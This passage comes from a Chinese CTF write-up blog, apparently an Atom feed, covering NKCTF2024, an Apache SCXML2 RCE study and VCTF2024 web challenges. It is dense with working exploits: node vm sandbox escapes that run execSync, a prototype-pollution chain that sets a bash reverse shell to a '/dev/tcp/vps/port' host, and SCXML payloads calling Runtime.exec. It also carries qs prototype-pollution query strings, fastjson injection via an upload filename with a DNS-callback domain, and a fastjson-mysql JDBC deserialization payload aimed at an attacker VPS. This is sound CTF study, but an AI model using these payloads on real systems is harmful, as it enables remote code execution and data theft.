class="hljs-title class_">pipes</span>&#123;    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">Collection</span>;    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Windows</span></span><span class="hljs-class">    </span>&#123;        <span class="hljs-keyword">private</span> <span class="hljs-variable">$files</span>;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">        </span>&#123;            <span class="hljs-variable language_">$this</span>-&gt;files = <span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Collection</span>());        &#125;    &#125;&#125;<span class="hljs-keyword">namespace</span> &#123;    $<span class="hljs-title class_">a</span> = <span class="hljs-title class_">new</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">process</span>\<span class="hljs-title class_">pipes</span>\<span class="hljs-title class_">Windows</span>();    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>((<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>)));&#125;</code></pre></div><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>无回显RCE，外带即可</p><p><img src="/../images/NKCTF2024/image-20240325193548757.png" alt="image-20240325193548757"></p><p><img src="/../images/NKCTF2024/image-20240325230249087.png" alt="image-20240325230249087"></p><h2 id="全世界最简单的CTF"><a href="#全世界最简单的CTF" class="headerlink" title="全世界最简单的CTF"></a>全世界最简单的CTF</h2><p>开头说思路将近AK，就是卡在这题</p><p>看源代码，发现&#x2F;secret，访问拿到app.js源码</p><div class="code-wrapper"><pre><code class="hljs js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>);<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;fs&quot;</span>);<span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">json</span>()).<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;views&#x27;</span>, path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;views&#x27;</span>)).<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;/public&#x27;</span>)))app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>)&#123;    res.<span class="hljs-title function_">sendFile</span>(__dirname + <span class="hljs-string">&#x27;/public/home.html&#x27;</span>);&#125;)<span class="hljs-keyword">function</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">code</span>) &#123;    <span class="hljs-keyword">let</span> pattern = <span class="hljs-regexp">/(process|\[.*?\]|exec|spawn|Buffer|\\|\+|concat|eval|Function)/g</span>;    <span class="hljs-keyword">if</span>(code.<span class="hljs-title function_">match</span>(pattern))&#123;        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;what can I say? hacker out!!&quot;</span>);    &#125;&#125;app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>)&#123;        <span class="hljs-keyword">let</span> code = req.<span class="hljs-property">body</span>.<span class="hljs-property">code</span>;        <span class="hljs-keyword">let</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);        <span class="hljs-keyword">let</span> context = vm.<span class="hljs-title function_">createContext</span>(sandbox);        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-title function_">waf</span>(code)            <span class="hljs-keyword">let</span> result = vm.<span class="hljs-title function_">runInContext</span>(code, context);            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result);        &#125; <span class="hljs-keyword">catch</span> (e)&#123;            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(e.<span class="hljs-property">message</span>);            <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./hack&#x27;</span>);        &#125;&#125;)app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/secret&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>)&#123;    <span class="hljs-keyword">if</span>(process.<span class="hljs-property">__filename</span> == <span class="hljs-literal">null</span>) &#123;        <span class="hljs-keyword">let</span> content = fs.<span class="hljs-title function_">readFileSync</span>(__filename, <span class="hljs-string">&quot;utf-8&quot;</span>);        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(content);    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-keyword">let</span> content = fs.<span class="hljs-title function_">readFileSync</span>(process.<span class="hljs-property">__filename</span>, <span class="hljs-string">&quot;utf-8&quot;</span>);        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(content);    &#125;&#125;)app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-function">()=&gt;</span>&#123;    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;listen on 3000&quot;</span>);&#125;)</code></pre></div><p>vm沙盒，并且作了一个waf</p><p>很多大佬使用replace进行绕过</p><h3 id="LaoGong的WP"><a href="#LaoGong的WP" class="headerlink" title="LaoGong的WP"></a>LaoGong的WP</h3><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(&#123;&#125;, &#123;        <span class="hljs-attr">get</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;            <span class="hljs-keyword">const</span> cc = <span class="hljs-variable language_">arguments</span>.<span class="hljs-property">callee</span>.<span class="hljs-property">caller</span>;            <span class="hljs-keyword">const</span> p = (cc.<span class="hljs-property">constructor</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&#x27;return procBess&#x27;</span>.replace(<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)</span>))();            <span class="hljs-keyword">const</span> obj = p.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_procBess&#x27;</span>.<span class="hljs-title function_">replace</span>(<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>));            <span class="hljs-keyword">const</span> ex = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertyDescriptor</span>(obj, <span class="hljs-string">&#x27;exeicSync&#x27;</span>.<span class="hljs-title function_">replace</span>(<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>));            <span class="hljs-keyword">return</span> ex.<span class="hljs-title function_">value</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>).<span class="hljs-title function_">toString</span>();        &#125;    &#125;)</code></pre></div><h3 id="官方WP"><a href="#官方WP" class="headerlink" title="官方WP"></a>官方WP</h3><p>&#x2F;secret中对<code>process.__filename</code>有一个判断，正常情况下process是没有<code>__filename</code>属性的</p><p>猜测可以原型链污染</p><p>然后就能任意文件读取</p><p>源码看到<code>require(&#39;.hack&#39;)</code>，我们污染为<code>/app/hack.js</code></p><p>内容为<code>console.log(&#39;shell.js&#39;)</code></p><p>继续读取shell.js</p><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;shell&#x27;</span>);<span class="hljs-keyword">const</span> p = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>);p.<span class="hljs-title function_">execSync</span>(process.<span class="hljs-property">env</span>.<span class="hljs-property">command</span>);</code></pre></div><p><code>process.env.command</code>也可以通过原型链污染控制</p><p>但问题是怎么去include这个shell.js呢</p><p>这里require可以通过原型链污染进行任意文件包含</p><p><a href="https://hujiekang.top/posts/nodejs-require-rce/">https://hujiekang.top/posts/nodejs-require-rce/</a></p><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(&#123;&#125;,&#123;    <span class="hljs-attr">get</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;        <span class="hljs-keyword">const</span> cc = <span class="hljs-variable language_">arguments</span>.<span class="hljs-property">callee</span>.<span class="hljs-property">caller</span>;        cc.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>.<span class="hljs-property">data</span> = &#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;./hack&quot;</span>,<span class="hljs-string">&quot;exports&quot;</span>:<span class="hljs-string">&quot;./shell.js&quot;</span>&#125;;        cc.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>.<span class="hljs-property">path</span> = <span class="hljs-string">&quot;/app&quot;</span>;        cc.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>.<span class="hljs-property">command</span> = <span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/vps/port 0&gt;&amp;1&#x27;&quot;</span>;    &#125;&#125;)</code></pre></div><p>。。。好吧，确实不会</p><h2 id="finally"><a href="#finally" class="headerlink" title="finally"></a>finally</h2><p>很烦，这也能爆零，可能动手能力太差了，以及实现的细节上出了很多问题</p><p>写的文章可能出现前后矛盾的情况，那也是因为在不断地反思错误，像提到的<code>__call</code>那个坑点，如果我不写这篇文章的话，我可能就认为我思路对了就不复现了，就发现不了这一点了</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Apache SCXML2 RCE</title>
    <link href="/2024/03/22/Apache-SCXML2-RCE/"/>
    <url>/2024/03/22/Apache-SCXML2-RCE/</url>
    
    <content type="html"><![CDATA[<h1 id="Apache-SCXML2-RCE"><a href="#Apache-SCXML2-RCE" class="headerlink" title="Apache SCXML2 RCE"></a>Apache SCXML2 RCE</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>跟着boogipop大佬学习的时候看到这篇，开始学习，但感觉是冷饭，没必要炒</p><p>同时也是Boogipop大佬出题在HDCTF中的一道</p><p>一直不知道导入什么依赖，最后在NSSCTF平台上找到这题，然后导入题目中的jar包</p><h2 id="原理及普遍的payload"><a href="#原理及普遍的payload" class="headerlink" title="原理及普遍的payload"></a>原理及普遍的payload</h2><p>原理不说了，大体还是比较清晰的，但还是有些地方没弄懂</p><p>看文章吧</p><p><a href="https://www.ctfiot.com/96133.html">https://www.ctfiot.com/96133.html</a></p><p>[Apache SCXML2 RCE分析 - Boogiepop Doesn’t Laugh (boogipop.com)](<a href="https://boogipop.com/2023/04/24/Apache">https://boogipop.com/2023/04/24/Apache</a> SCXML2 RCE分析&#x2F;)</p><h2 id="其他payload"><a href="#其他payload" class="headerlink" title="其他payload"></a>其他payload</h2><p>boogipop大佬发现了很多其他的payload，对这一部分比较感兴趣，我也来看看</p><p><img src="/../images/Apache-SCXML2-RCE/image-20240322162841257.png" alt="image-20240322162841257"></p><p>说明<code>Cond、Location、Assign、Script</code>起码都是可以的</p><p><img src="/../images/Apache-SCXML2-RCE/image-20240322163752094.png" alt="image-20240322163752094"></p><p>但这一段为什么是调用eval不太理解</p><p>我们可以从这里写入数据</p><p><img src="/../images/Apache-SCXML2-RCE/image-20240322163936470.png" alt="image-20240322163936470"></p><p>五个最外层标签都可以下手</p><p>给出Boogipop大佬的结论</p><p>最终可用来执行命令的属性或者是标签为</p><ul><li>script标签</li><li>expr属性</li><li>cond属性</li><li>assign标签的expr属性（归根还是expr属性)</li></ul><h3 id="各种尝试"><a href="#各种尝试" class="headerlink" title="各种尝试"></a>各种尝试</h3><h4 id="script"><a href="#script" class="headerlink" title="script"></a>script</h4><p>最外层是script的逻辑最简单</p><p>被设置为了GlobalScript</p><p>然后在go后走到这里就会执行，比正常的要快执行，调试过就知道了</p><p><img src="/../images/Apache-SCXML2-RCE/image-20240322164448708.png" alt="image-20240322164448708"></p><p>然后就能提前走到<code>evalScript</code></p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">scxml</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/2005/07/scxml&quot;</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><span class="language-javascript">        <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-title function_">getClass</span>().<span class="hljs-title function_">forName</span>(<span class="hljs-string">&#x27;java.lang.Runtime&#x27;</span>).<span class="hljs-title function_">getRuntime</span>().<span class="hljs-title function_">exec</span>(<span class="hljs-string">&#x27;calc&#x27;</span>)</span><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">scxml</span>&gt;</span></code></pre></div><h4 id="datamodel"><a href="#datamodel" class="headerlink" title="datamodel"></a>datamodel</h4><p>子标签只接受data</p><p><img src="/../images/Apache-SCXML2-RCE/image-20240322164817158.png" alt="image-20240322164817158"></p><p><img src="/../images/Apache-SCXML2-RCE/image-20240322164927628.png" alt="image-20240322164927628"></p><p>data标签要有id和expr属性</p><p>下断点调试，发现在这里获取expr属性</p><p><img src="/../images/Apache-SCXML2-RCE/image-20240322165639421.png" alt="image-20240322165639421"></p><p>然后进入eval方法执行</p><p>于是</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">scxml</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/2005/07/scxml&quot;</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">datamodel</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">data</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-attr">expr</span>=<span class="hljs-string">&quot;&#x27;&#x27;.class.forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc.exe&#x27;)&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">data</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">datamodel</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">scxml</span>&gt;</span></code></pre></div><h4 id="final"><a href="#final" class="headerlink" title="final"></a>final</h4><p>只接受onentry和onexit两个子标签</p><p><img src="/../images/Apache-SCXML2-RCE/image-20240322170427934.png" alt="image-20240322170427934"></p><p>两个方法都会调用readExecutableContext函数</p><p>所以他们是可以互相替代的</p><p>接着继续看onentry和onexit接受的子标签</p><p><img src="/../images/Apache-SCXML2-RCE/image-20240322174827660.png" alt="image-20240322174827660"></p><p><img src="/../images/Apache-SCXML2-RCE/image-20240322174632696.png" alt="image-20240322174632696"></p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">scxml</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/2005/07/scxml&quot;</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">final</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">onentry</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><span class="language-javascript">                    <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-title function_">getClass</span>().<span class="hljs-title function_">forName</span>(<span class="hljs-string">&#x27;java.lang.Runtime&#x27;</span>).<span class="hljs-title function_">getRuntime</span>().<span class="hljs-title function_">exec</span>(<span class="hljs-string">&#x27;calc&#x27;</span>)</span><span class="language-javascript">                </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">assign</span> <span class="hljs-attr">location</span>=<span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-attr">expr</span>=<span class="hljs-string">&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;</span>/&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">cond</span>=<span class="hljs-string">&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">log</span> <span class="hljs-attr">expr</span>=<span class="hljs-string">&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">log</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">send</span> <span class="hljs-attr">idlocation</span>=<span class="hljs-string">&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">send</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">cancel</span> <span class="hljs-attr">sendidexpr</span>=<span class="hljs-string">&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">cancel</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">foreach</span> <span class="hljs-attr">array</span>=<span class="hljs-string">&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;</span> <span class="hljs-attr">item</span>=<span class="hljs-string">&quot;a&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">foreach</span>&gt;</span>            <span class="hljs-tag">&lt;/<span class="hljs-name">onentry</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">final</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">scxml</span>&gt;</span></code></pre></div><p>每个都行，嘻嘻，自己分析吧</p><h4 id="parallel"><a href="#parallel" class="headerlink" title="parallel"></a>parallel</h4><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">scxml</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/2005/07/scxml&quot;</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">parallel</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">invoke</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;test&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;test&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;flag&quot;</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-attr">expr</span>=<span class="hljs-string">&quot;&#x27;&#x27;.class.forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc.exe&#x27;)&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">invoke</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">parallel</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">scxml</span>&gt;</span></code></pre></div><h4 id="state"><a href="#state" class="headerlink" title="state"></a>state</h4><p>没啥好说的了，但是onentry和onexit好像并不能进行替换，onexit不能成功</p><h2 id="finally"><a href="#finally" class="headerlink" title="finally"></a>finally</h2><p>冷饭硬炒，没啥意思，随便看看吧</p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p>[Apache SCXML2 RCE分析 - Boogiepop Doesn’t Laugh (boogipop.com)](<a href="https://boogipop.com/2023/04/24/Apache">https://boogipop.com/2023/04/24/Apache</a> SCXML2 RCE分析&#x2F;)</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>VCTF2024</title>
    <link href="/2024/03/18/VCTF2024/"/>
    <url>/2024/03/18/VCTF2024/</url>
    
    <content type="html"><![CDATA[<h1 id="VCTF2024-–web"><a href="#VCTF2024-–web" class="headerlink" title="VCTF2024 –web"></a>VCTF2024 –web</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>web爆零了，纯废物，只会签到</p><h2 id="hackjs"><a href="#hackjs" class="headerlink" title="hackjs"></a>hackjs</h2><p>大体思路是对的，但具体不知道如何实现</p><p><img src="/../images/VCTF2024/image-20240318185351949.png" alt="image-20240318185351949"></p><p>代码很少</p><p>检查venom的键长度小于3，venom的welcome为159753，且要进入catch块，并且venom的text为flag</p><p>正常情况下是不会异常的，唯一能报异常的地方就是hasOwnProperty</p><p>并且express的版本为4.17.2，express@(-∞, 4.17.3)中依赖的qs模块存在数组原型污染漏洞</p><p><a href="https://github.com/n8tz/CVE-2022-24999">n8tz&#x2F;CVE-2022-24999: “qs” prototype poisoning vulnerability ( CVE-2022-24999 ) (github.com)</a></p><h3 id="误区"><a href="#误区" class="headerlink" title="误区"></a>误区</h3><p>但是我这里进入异常的方式错了，我的想法是非对象没有hasOwnProperty方法，才会进入catch块</p><p>经过本地测试，只有null才行</p><p>然后我就理所应当的以为找一个不存在的元素利用它进行原型链污染就行，但实际上Object.keys传入null的话会报错</p><h3 id="正解"><a href="#正解" class="headerlink" title="正解"></a>正解</h3><p>覆盖hasOwnProperty为任意字符即可抛出异常</p><div class="code-wrapper"><pre><code class="hljs inform7">venom<span class="hljs-comment">[text]</span>=flag&amp;venom<span class="hljs-comment">[welcome]</span>=159753&amp;venom<span class="hljs-comment">[hasOwnPropert]</span>=1</code></pre></div><p>但是这样的话venom的键的长度为3，不符合条件</p><p>这里的话使用<code>__proto__</code>作为键的话是不会算入长度的</p><p>但是这里不能使用json进行传输，用json的话<code>__proto__</code>还是会算入长度</p><p>并且很怪的是<code>__proto__</code>只能放在第一个才能起作用，放在后面就不行了</p><div class="code-wrapper"><pre><code class="hljs inform7">venom<span class="hljs-comment">[__proto__]</span><span class="hljs-comment">[text]</span>=flag&amp;venom<span class="hljs-comment">[welcome]</span>=159753&amp;venom<span class="hljs-comment">[hasOwnProperty]</span>=1venom<span class="hljs-comment">[__proto__]</span><span class="hljs-comment">[welcome]</span>=159753&amp;venom<span class="hljs-comment">[text]</span>=flag&amp;venom<span class="hljs-comment">[hasOwnProperty]</span>=1venom<span class="hljs-comment">[__proto__]</span><span class="hljs-comment">[hasOwnProperty]</span>=1&amp;venom<span class="hljs-comment">[welcome]</span>=159753&amp;venom<span class="hljs-comment">[text]</span>=flag</code></pre></div><p><img src="/../images/VCTF2024/image-20240318193031752.png" alt="image-20240318193031752"></p><p><img src="/../images/VCTF2024/image-20240318203645759.png" alt="image-20240318203645759"></p><p><img src="/../images/VCTF2024/image-20240318193017555.png" alt="image-20240318193017555"></p><p>真的玄学</p><h2 id="Archived-elephant"><a href="#Archived-elephant" class="headerlink" title="Archived elephant"></a>Archived elephant</h2><p><img src="/../images/VCTF2024/image-20240318194404626.png" alt="image-20240318194404626"></p><h3 id="我的简单思路"><a href="#我的简单思路" class="headerlink" title="我的简单思路"></a>我的简单思路</h3><p>看的比较晚，给出了些提示</p><p>并且结合提示，与ueditor无关，与文件上传也无关</p><p>那就只好看依赖了</p><p><img src="/../images/VCTF2024/image-20240318212444378.png" alt="image-20240318212444378"></p><p>比较熟悉的是fastjson+commons-io能够写文件 （但我竟然忘记了fastjson+mysql，后面再说</p><p>然后fileupload的版本太高，上传的文件不能控制</p><p>虽然没思路，继续看代码，看看提示的BaseState</p><p><img src="/../images/VCTF2024/image-20240318213050995.png" alt="image-20240318213050995"></p><p>很明显，放入key和value</p><p>但是一直找不到<code>JSON.parseObject</code>，反编译的文件又不能搜索字符串</p><p>最后终于找到</p><p><img src="/../images/VCTF2024/image-20240318213629264.png" alt="image-20240318213629264"></p><p>我的思路就到这，如何控制参数也没分析出来</p><h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p><code>ActionEnter#invoke</code>方法调用了<code>state#toJSONString</code>,可以看到当<code>ActionMap</code>为<code>UPLOAD_FILE</code>（文件上传）操作时会触发 <code>Uploader#doExec</code></p><p><img src="/../images/VCTF2024/image-20240321194359350.png" alt="image-20240321194359350"></p><p>conf中设置isBase64为false</p><p><img src="/../images/VCTF2024/image-20240321194506223.png" alt="image-20240321194506223"></p><p>在Uploader#doExec()中就进入else语句</p><p><img src="/../images/VCTF2024/image-20240321194536647.png" alt="image-20240321194536647"></p><p><img src="/../images/VCTF2024/image-20240321194820075.png" alt="image-20240321194820075"></p><p>可以看到<code>originFileName</code>是由上传表单的<code>filename</code>控制的，值得注意的一点是程序（仅仅）校验了后缀名，这很好绕过。令<code>filename</code>为<code>filename=flag&quot;,&quot;vulnerable&quot;:&quot;hacked&quot;,&quot;a&quot;:&quot;.txt</code>即可绕过检测。最终把<code>originFileName</code>放进<code>BaseState</code></p><p><img src="/../images/VCTF2024/image-20240321194915156.png" alt="image-20240321194915156"></p><p>我都不会本地测试（呜呜呜</p><p>值得注意的一点是<code>json</code>的第一个属性<code>&quot;state&quot;:&quot;SUCCESS</code>“是不可控的，可能不太了解<code>fastjson</code>利用的师傅看到这里就绝望了，因为网上的<code>payload</code>都是<code>@Type</code>作为第一个属性开头的呀。其实这里一个小<code>trick</code>令<code>filename</code>为<code>flag&quot;,&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;bgb5eh.ceye.io&quot;&#125;,&quot;a&quot;:&quot;.txt</code>即可正常恢复<code>Java Bean</code></p><p>。。。。我也不了解fastjson</p><h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>如何利用JSON.parseObject呢，看到以来中有fastjson+mysql，版本符合存在漏洞</p><p>但不能进行jdbc反序列化，版本好像超了，尝试也没成功</p><p>网上经过别人实测，fastjson只能打mysql的5.1.11-5.1.48(反序列化链)、6.0.2&#x2F;6.0.3(反序列化)、8.0.19(反序列化链)</p><p>所以理论和实际都说明了不能打反序列化链</p><p>但是可以任意文件读取</p><p>看一下打反序列化的payload</p><div class="code-wrapper"><pre><code class="hljs perl">&#123; <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>, <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.mysql.jdbc.JDBC4Connection&quot;</span>, <span class="hljs-string">&quot;hostToConnectTo&quot;</span>: <span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-string">&quot;portToConnectTo&quot;</span>: <span class="hljs-number">3306</span>, <span class="hljs-string">&quot;info&quot;</span>: &#123; <span class="hljs-string">&quot;user&quot;</span>: <span class="hljs-string">&quot;yso_CommonsBeanutils1_calc&quot;</span>, <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;pass&quot;</span>, <span class="hljs-string">&quot;statementInterceptors&quot;</span>: <span class="hljs-string">&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>, <span class="hljs-string">&quot;autoDeserialize&quot;</span>: <span class="hljs-string">&quot;true&quot;</span>, <span class="hljs-string">&quot;NUM_HOSTS&quot;</span>: <span class="hljs-string">&quot;1&quot;</span> &#125;, <span class="hljs-string">&quot;databaseToConnectTo&quot;</span>: <span class="hljs-string">&quot;dbname&quot;</span>, <span class="hljs-string">&quot;url&quot;</span>: <span class="hljs-string">&quot;&quot;</span> &#125;</code></pre></div><p>可以看出info中的属性，其实就是一般jdbc连接中携带的参数</p><p>我们把他修改为任意文件读取要的参数即可</p><div class="code-wrapper"><pre><code class="hljs perl">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>,<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.mysql.jdbc.JDBC4Connection&quot;</span>,<span class="hljs-string">&quot;hostToConnectTo&quot;</span>:<span class="hljs-string">&quot;你的vps-ip&quot;</span>,<span class="hljs-string">&quot;portToConnectTo&quot;</span>:<span class="hljs-number">3308</span>,<span class="hljs-string">&quot;databaseToConnectTo&quot;</span>:<span 